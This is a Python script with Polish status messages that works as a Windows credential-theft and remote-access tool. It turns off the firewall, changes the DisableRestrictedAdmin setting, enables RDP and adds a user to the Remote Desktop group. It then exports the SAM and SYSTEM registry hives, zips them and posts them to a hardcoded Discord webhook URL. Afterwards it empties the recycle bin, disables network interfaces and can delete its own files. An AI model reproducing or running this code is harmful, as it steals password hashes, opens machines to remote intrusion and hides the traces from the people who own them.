import os

def check_libs():
    os.system('cls')
    libs = ["subprocess", "shutil", "requests", "colorama", "socket", "os", "send2trash","time","zipfile","gzip","io"]
    for lib in libs:
        try:
            __import__(lib)
        except ImportError:
            os.system(f"pip install {lib}")
    os.system('cls')
check_libs()

from colorama import Fore
import subprocess
import send2trash
import requests
import zipfile
import shutil
import socket
import time

def get_local_ip():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(f"{Fore.GREEN}Pobrano lokalny adres IP: {local_ip}{Fore.RESET}")
        return local_ip
    except Exception as e:
        print(f"{Fore.RED}Wystąpił błąd podczas pobierania lokalnego adresu IP:", str(e), Fore.RESET)
        return None

def get_hostname():
    try:
        hostname = socket.gethostname()
        print(f"{Fore.GREEN}Pobrano nazwę hosta: {hostname}{Fore.RESET}")
        return hostname
    except Exception as e:
        print(f"{Fore.RED}Wystąpił błąd podczas pobierania nazwy hosta:", str(e), Fore.RESET)
        return None


def copy_sam_registry_keys():
    def is_recycle_bin_empty():
        try:
            send2trash.send2trash('test_file.txt')
            return False
        except Exception:
            return True
    try:
        local_ip = get_local_ip()
        hostname = get_hostname()
        
        if local_ip and hostname:
            def sam():
                subprocess.run(['regedit', '/e', 'sam.save', 'HKEY_LOCAL_MACHINE\SAM'])
                shutil.move('sam.save', 'C:\\Users\\Public\\sam.save')
                print(f"{Fore.GREEN}Klucz rejestru SAM został skopiowany do ścieżki C:\\Users\\Public\\sam.save{Fore.RESET}")
            def system():
                subprocess.run(['regedit', '/e', 'system.save', 'HKEY_LOCAL_MACHINE\SYSTEM'])
                shutil.move('system.save', 'C:\\Users\\Public\\system.save')
                print(f"{Fore.GREEN}Klucz rejestru SYSTEM został skopiowany do ścieżki C:\\Users\\Public\\system.save{Fore.RESET}")                
            try:
                sam()
            except Exception as e:
                print(f"{Fore.RED}Wystąpił błąd podczas kopiowania klucza rejestru SAM:", str(e), Fore.RESET)
            try:
                system()
            except Exception as e:
                print(f"{Fore.RED}Wystąpił błąd podczas kopiowania klucza rejestru SYSTEM:", str(e), Fore.RESET)
            
            # ! start
            zip_file_path = f"C:\\Users\\Public\\regKeys-{local_ip}.zip"
            with zipfile.ZipFile(zip_file_path, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.write("C:\\Users\\Public\\sam.save")
                zf.write("C:\\Users\\Public\\system.save")

            if os.path.getsize(zip_file_path) < 8 * 1024 * 1024:
                with open(zip_file_path, "rb") as f:
                    file_content = f.read()

                url = "https://discord.com/api/webhooks/1204735031109750846/UOnsaR52E0AyNZuYd5LNc5h6oSM-k74yz45LLgd6BqcDY1HFJRh_yf4VFD8jFtK4Tl8o"
                files = {"file.zip": file_content}

                response = requests.post(url, files=files)

                if response.status_code == 200:
                    print(f"{Fore.GREEN}REGISTERY KEY został wysłany na webhook Discord{Fore.RESET}")
                else:
                    print(f"{Fore.RED}Wystąpił błąd podczas wysyłania pliku na webhook Discord (Code: {response.status_code}){Fore.RESET}")
            else:
                print(f"{Fore.RED}Rozmiar pliku ZIP przekracza 8 MB. Spróbuj skompresować pliki bardziej efektywnie.{Fore.RESET}")
            # ! end
            
            if is_recycle_bin_empty():
                print(f"{Fore.GREEN}Kosz jest pusty. Nie usuwam zawartości kosza.{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}Kosz nie jest pusty. Usuwam zawartość kosza.{Fore.RESET}")
                try:
                    os.system('powershell.exe -Command "Clear-RecycleBin -Force"')
                    print(f"{Fore.GREEN}Kosz został opróżniony{Fore.RESET}")
                except Exception as e:
                    print(f"{Fore.RED}Wystąpił błąd podczas opróżniania kosza:", str(e), Fore.RESET)
        else:
            print(f"{Fore.RED}Nie udało się pobrać lokalnego adresu IP lub nazwy hosta.{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}Wystąpił błąd podczas kopiowania klucza rejestru SAM:", str(e), Fore.RESET)

def clean_files(local_ip):
    try:
        send2trash.send2trash(r'C:\Users\Public\sam.save')
        print(f"{Fore.GREEN}Plik SAM.save został usunięty z folderu Public{Fore.RESET}")
        send2trash.send2trash(r'C:\Users\Public\system.save')
        print(f"{Fore.GREEN}Plik SYSTEM.save został usunięty z folderu Public{Fore.RESET}")
        send2trash.send2trash(rf'C:\Users\Public\regKeys-{local_ip}.zip')
        print(f"{Fore.GREEN}Plik SYSTEM.save został usunięty z folderu Public{Fore.RESET}") 
    except Exception as e:
        print(f"{Fore.RED}Wystąpił błąd podczas usuwania plików z folderu Public:", str(e), Fore.RESET)

def disable_restricted_admin():
    try:
        subprocess.run(['reg', 'add', 'HKLM\System\CurrentControlSet\Control\Lsa', '/t', 'REG_DWORD', '/v', 'DisableRestrictedAdmin', '/d', '0x0', '/f'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Disabled 'DisableRestrictedAdmin' registry key{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while disabling 'DisableRestrictedAdmin' registry key:", str(e), Fore.RESET)

def turn_off_windows_firewall():
    try:
        subprocess.run(['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Turned off Windows Firewall{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while turning off Windows Firewall:", str(e), Fore.RESET)

def enable_rdp_and_add_user_to_rdp_users_group():
    try:
        subprocess.run(['reg', 'add', 'HKLM\System\CurrentControlSet\Control\Terminal Server', '/t', 'REG_DWORD', '/v', 'fDenyTSConnections', '/d', '0x0', '/f'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['net', 'localgroup', 'Remote Desktop Users', 'username', '/add'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Enabled RDP and added user to RDP Users group{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while enabling RDP and adding user to RDP Users group:", str(e), Fore.RESET)

def reverse_disable_restricted_admin():
    try:
        subprocess.run(['reg', 'add', 'HKLM\System\CurrentControlSet\Control\Lsa', '/t', 'REG_DWORD', '/v', 'DisableRestrictedAdmin', '/d', '0x1', '/f'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Enabled 'DisableRestrictedAdmin' registry key{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while enabling 'DisableRestrictedAdmin' registry key:", str(e), Fore.RESET)

def reverse_turn_off_windows_firewall():
    try:
        subprocess.run(['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'on'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Turned on Windows Firewall{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while turning on Windows Firewall:", str(e), Fore.RESET)

def reverse_enable_rdp_and_add_user_to_rdp_users_group():
    try:
        subprocess.run(['reg', 'add', 'HKLM\System\CurrentControlSet\Control\Terminal Server', '/t', 'REG_DWORD', '/v', 'fDenyTSConnections', '/d', '0x1', '/f'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['net', 'localgroup', 'Remote Desktop Users', 'username', '/delete'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Disabled RDP and removed user from RDP Users group{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while disabling RDP and removing user from RDP Users group:", str(e), Fore.RESET)
def defender_scan():
    try:
        print(f"{Fore.GREEN}Started a quick scan with Windows Defender{Fore.RESET}")
        start_time = time.time()
        subprocess.run(['powershell', '-command', 'Start-MpScan -ScanType Quick'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Finished a quick scan with Windows Defender in {Fore.RESET}{round(time.time() - start_time)}s")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while starting a quick scan with Windows Defender:", str(e), Fore.RESET)
def set_volume_to_100():
    try:
        subprocess.run(['sndvol32', '-v', '100'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Set volume to 0{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while setting volume to 0:", str(e), Fore.RESET)

def disable_bluetooth_and_internet():
    try:
        subprocess.run(['netsh', 'interface', 'set','interface','"Bluetooth Network Connection"','disabled'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['netsh', 'interface', 'set','interface','"Ethernet"','admin=disabled'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Disabled Bluetooth and Internet{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while disabling Bluetooth and Internet:", str(e), Fore.RESET)

def enable_airplane_mode():
    try:
        subprocess.run(['netsh', 'interface', 'set','interface','all','admin=disable'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Enabled Airplane Mode{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while enabling Airplane Mode:", str(e), Fore.RESET)

def disable_airplane_mode():
    try:
        subprocess.run(['netsh', 'interface', 'set','interface','all','admin=enable'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Disabled Airplane Mode{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while disabling Airplane Mode:", str(e), Fore.RESET)

def set_brightness_to_zero():
    try:
        subprocess.run(['powercfg', '/setacpowerscheme', 'brightness','0'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Set brightness to 0{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while setting brightness to 0:", str(e), Fore.RESET)

def set_brightness_to_80():
    try:
        subprocess.run(['powercfg', '/setacpowerscheme', 'brightness','80'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Set brightness to 80{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while setting brightness to 80:", str(e), Fore.RESET)

def enable_bluetooth_and_internet():
    try:
        subprocess.run(['netsh', 'interface', 'set','interface','"Bluetooth Network Connection"','enabled'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['netsh', 'interface', 'set','interface','"Ethernet"','admin=enabled'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Enabled Bluetooth and Internet{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while disabling Bluetooth and Internet:", str(e), Fore.RESET)

os.system('cls')
do = input(f"")

if do == "":
    disable_restricted_admin()
    turn_off_windows_firewall()
    enable_rdp_and_add_user_to_rdp_users_group()
    copy_sam_registry_keys()
    set_volume_to_100()
    disable_bluetooth_and_internet()
    enable_airplane_mode()
    set_brightness_to_zero()
elif do == "r":
    reverse_disable_restricted_admin()
    reverse_turn_off_windows_firewall()
    reverse_enable_rdp_and_add_user_to_rdp_users_group()
    enable_bluetooth_and_internet()
    disable_airplane_mode()
    set_brightness_to_80()
    clean_files(local_ip=get_local_ip())
    defender_scan()
elif do == "n":
    print(f"{Fore.YELLOW}Skrypt nie został wykonany.{Fore.RESET}")
else:
    print(f"{Fore.RED}Niepoprawna odpowiedź.{Fore.RESET}")

# ? reg save HKLM\sam D:\sam.save
# ? reg save HKLM\system D:\system.save